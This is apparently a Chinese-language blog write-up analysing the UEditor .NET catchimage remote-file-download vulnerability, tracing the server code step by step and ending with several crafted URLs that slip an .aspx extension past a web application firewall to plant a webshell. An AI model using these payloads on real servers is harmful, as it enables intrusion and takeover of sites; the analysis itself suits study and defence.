首先下载了ueditor编译器的源码，ueditor实际上不止.net  还有php、jsp的，实战也经常碰到，但是.net的成功率大一点(如果目标出网)，通过理解漏洞代码原理从而更好的去绕waf。
<a name="eGHzg"></a>
## 漏洞poc
首先漏洞的poc是这样子的<br />[http://ip/ueditor/net/controller.ashx?action=catchimage](http://ip/ueditor/net/controller.ashx?action=catchimage)

复现文章 [https://www.yuque.com/aufeng/aufeng_good/dtccn7](https://www.yuque.com/aufeng/aufeng_good/dtccn7)
<a name="xKvG4"></a>
## 代码分析
对controller.ashx进行分析，在63行中如果选择catchimage会进入到CrawlerHandler对象<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1664112285165-c21ed5d2-4e7c-4a94-94d9-7eeca3682a97.png#clientId=ucc2d4c27-7518-4&from=paste&height=469&id=u8b287f93&originHeight=586&originWidth=1156&originalType=binary&ratio=1&rotation=0&showTitle=false&size=85900&status=done&style=none&taskId=u4a7be389-e58e-413c-a166-6f01b3dae83&title=&width=924.8)

跟进CrawlerHandler对象，对source传入的值进行判断，如果没有就会报错，有的话就进入Fetch方法中<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1664112934903-ad532fe6-b3e0-429c-8db4-01bca64e215e.png#clientId=ucc2d4c27-7518-4&from=paste&height=401&id=u0fbadebc&originHeight=437&originWidth=679&originalType=binary&ratio=1&rotation=0&showTitle=false&size=50608&status=done&style=none&taskId=u3484048d-bc56-4d56-845b-d0eba3637e2&title=&width=623.2000122070312)

在Fetch方法中IsExternalIPAddress判断了source传入的值是不是正常的url，然后用HttpWebRequest.Create的方法去进行远程请求，然后再根据response进行判断响应是不是正常，然后传入的SourceUrl会进入PathFormatter.Format方法中<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1664113213767-41ce3df2-859b-47bd-b95b-18a734764ee9.png#clientId=ucc2d4c27-7518-4&from=paste&height=353&id=u4cd1b282&originHeight=499&originWidth=951&originalType=binary&ratio=1&rotation=0&showTitle=false&size=90478&status=done&style=none&taskId=u395e2058-f6fe-4422-9212-e19d7920b3e&title=&width=672.4000244140625)

**那么，ueditor最关键的地方来了，以及如果绕waf等操作**。<br />进入这个方法后PathFormatter.Format，会对传入的SourceUrl赋值给originFileName，然后originFileName会被正则(new Regex(@"[\\\/\:\*\?\042\<\>\|]"))匹配获取后缀名。其中042是代表八进制中的"<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1664113717445-c11dfb99-2d67-4b9a-8c6b-ef78d4e7b837.png#clientId=ucc2d4c27-7518-4&from=paste&height=255&id=u001f9956&originHeight=236&originWidth=630&originalType=binary&ratio=1&rotation=0&showTitle=false&size=40455&status=done&style=none&taskId=u5aa5353b-d049-439c-9f86-7b26f10a279&title=&width=682)

实际上获取完后缀名后，这个extension就以及不受其他因素干扰了，然后通过return返回文件后缀值。<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1664115780843-06aeabeb-af6a-488b-95f1-afb339f03fd0.png#clientId=ucc2d4c27-7518-4&from=paste&height=502&id=u2d216510&originHeight=627&originWidth=1121&originalType=binary&ratio=1&rotation=0&showTitle=false&size=149291&status=done&style=none&taskId=u3a09d052-5337-4d31-b88d-89d02364dbe&title=&width=896.8)

那么回到Fetch方法中就是extension赋值给ServerUrl，然后通过GetResponseStream把响应包中的字节流转换写入到服务器中。那么ueditor编译器漏洞 远程下载利用整个流程就是这样子了。<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1664115862026-9ce7da79-8dbf-4b4c-b32b-794c14190184.png#clientId=ucc2d4c27-7518-4&from=paste&height=547&id=ue6c450e5&originHeight=684&originWidth=1006&originalType=binary&ratio=1&rotation=0&showTitle=false&size=101779&status=done&style=none&taskId=u22c3f32f-0025-4123-8ecc-0627ceae4a4&title=&width=804.8)
<a name="aH56x"></a>
## 绕waf操作
对原理进行代码分析，这个匹配只是为了把http://X.X.X.X/1.png中的//和.以及*?<>|去除掉，那么网上的文章都是以http://xxx.xxx.xx.xx/1.png?.aspx等形式传入，如果waf对aspx这个后缀进行拦截的话，我们还有很多组合拳的操作可以打,例如：<br />http://xxx.xxx.xx.xx/1.png?.a???s????p?????x <br />http://xxx.xxx.xx.xx/1.png?.a<>s<>p<>x <br />http://xxx.xxx.xx.xx/1.png?.a<""||s<"">p<>x<br />这种形式最后也可以绕过waf部署shell<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1664114205665-d1c3cc7c-9274-4b8a-ba89-9e28c12d9554.png#clientId=ucc2d4c27-7518-4&from=paste&height=221&id=u10096aa8&originHeight=158&originWidth=473&originalType=binary&ratio=1&rotation=0&showTitle=false&size=10993&status=done&style=none&taskId=u81246a84-16e2-41a1-ac0c-1457ab463bf&title=&width=661.3999938964844)<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1664122617892-8294b9e0-5be8-449c-b1ab-6212b92c6fdd.png#clientId=u08471d31-0250-4&from=paste&height=172&id=u68dabc1b&originHeight=141&originWidth=539&originalType=binary&ratio=1&rotation=0&showTitle=false&size=11125&status=done&style=none&taskId=u42d2ff67-b315-4d80-91d1-3388316edcf&title=&width=658.2000122070312)
